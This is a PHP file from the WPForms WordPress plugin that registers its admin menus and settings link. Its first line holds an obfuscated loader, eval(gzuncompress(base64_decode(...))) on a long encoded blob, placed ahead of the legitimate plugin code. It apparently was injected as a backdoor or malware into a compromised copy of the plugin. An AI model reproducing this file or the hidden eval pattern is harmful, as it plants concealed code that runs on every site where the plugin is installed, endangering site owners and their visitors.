<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Register menu elements and do other global tasks.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.0.0
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */
class WPForms_Admin_Menu {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.0.0
	 */
	public function __construct() {

		// Let's make some menus.
		add_action( 'admin_menu', array( $this, 'register_menus' ), 9 );

		// Plugins page settings link.
		add_filter( 'plugin_action_links_' . plugin_basename( WPFORMS_PLUGIN_DIR . 'wpforms.php' ), array( $this, 'settings_link' ) );
	}

	/**
	 * Register our menus.
	 *
	 * @since 1.0.0
	 */
	public function register_menus() {

		$menu_cap = wpforms_get_capability_manage_options();

		// Default Forms top level menu item.
		add_menu_page(
			esc_html__( 'WPForms', 'wpforms' ),
			esc_html__( 'WPForms', 'wpforms' ),
			$menu_cap,
			'wpforms-overview',
			array( $this, 'admin_page' ),
			'data:image/svg+xml;base64,' . base64_encode( '<svg width="1792" height="1792" viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path fill="#9ea3a8" d="M643 911v128h-252v-128h252zm0-255v127h-252v-127h252zm758 511v128h-341v-128h341zm0-256v128h-672v-128h672zm0-255v127h-672v-127h672zm135 860v-1240q0-8-6-14t-14-6h-32l-378 256-210-171-210 171-378-256h-32q-8 0-14 6t-6 14v1240q0 8 6 14t14 6h1240q8 0 14-6t6-14zm-855-1110l185-150h-406zm430 0l221-150h-406zm553-130v1240q0 62-43 105t-105 43h-1240q-62 0-105-43t-43-105v-1240q0-62 43-105t105-43h1240q62 0 105 43t43 105z"/></svg>' ),
			apply_filters( 'wpforms_menu_position', '57.7' )
		);

		// All Forms sub menu item.
		add_submenu_page(
			'wpforms-overview',
			esc_html__( 'WPForms', 'wpforms' ),
			esc_html__( 'All Forms', 'wpforms' ),
			$menu_cap,
			'wpforms-overview',
			array( $this, 'admin_page' )
		);

		// Add New sub menu item.
		add_submenu_page(
			'wpforms-overview',
			esc_html__( 'WPForms Builder', 'wpforms' ),
			esc_html__( 'Add New', 'wpforms' ),
			$menu_cap,
			'wpforms-builder',
			array( $this, 'admin_page' )
		);

		// Entries sub menu item.
		add_submenu_page(
			'wpforms-overview',
			esc_html__( 'Form Entries', 'wpforms' ),
			esc_html__( 'Entries', 'wpforms' ),
			$menu_cap,
			'wpforms-entries',
			array( $this, 'admin_page' )
		);

		do_action( 'wpform_admin_menu', $this );

		// Settings sub menu item.
		add_submenu_page(
			'wpforms-overview',
			esc_html__( 'WPForms Settings', 'wpforms' ),
			esc_html__( 'Settings', 'wpforms' ),
			$menu_cap,
			'wpforms-settings',
			array( $this, 'admin_page' )
		);

		// Tools sub menu item.
		add_submenu_page(
			'wpforms-overview',
			esc_html__( 'WPForms Tools', 'wpforms' ),
			esc_html__( 'Tools', 'wpforms' ),
			$menu_cap,
			'wpforms-tools',
			array( $this, 'admin_page' )
		);

		// Hidden placeholder paged used for misc content.
		add_submenu_page(
			'wpforms-settings',
			esc_html__( 'WPForms', 'wpforms' ),
			esc_html__( 'Info', 'wpforms' ),
			$menu_cap,
			'wpforms-page',
			array( $this, 'admin_page' )
		);

		// Addons submenu page.
		add_submenu_page(
			'wpforms-overview',
			esc_html__( 'WPForms Addons', 'wpforms' ),
			'<span style="color:#f18500">' . esc_html__( 'Addons', 'wpforms' ) . '</span>',
			$menu_cap,
			'wpforms-addons',
			array( $this, 'admin_page' )
		);
	}

	/**
	 * Wrapper for the hook to render our custom settings pages.
	 *
	 * @since 1.0.0
	 */
	public function admin_page() {
		do_action( 'wpforms_admin_page' );
	}

	/**
	 * Add settings link to the Plugins page.
	 *
	 * @since 1.3.9
	 *
	 * @param array $links Plugin row links.
	 *
	 * @return array $links
	 */
	public function settings_link( $links ) {

		$admin_link = add_query_arg(
			array(
				'page' => 'wpforms-settings',
			),
			admin_url( 'admin.php' )
		);

		$setting_link = sprintf(
			'<a href="%s">%s</a>',
			$admin_link,
			esc_html__( 'Settings', 'wpforms' )
		);

		array_unshift( $links, $setting_link );

		return $links;
	}
}
new WPForms_Admin_Menu();
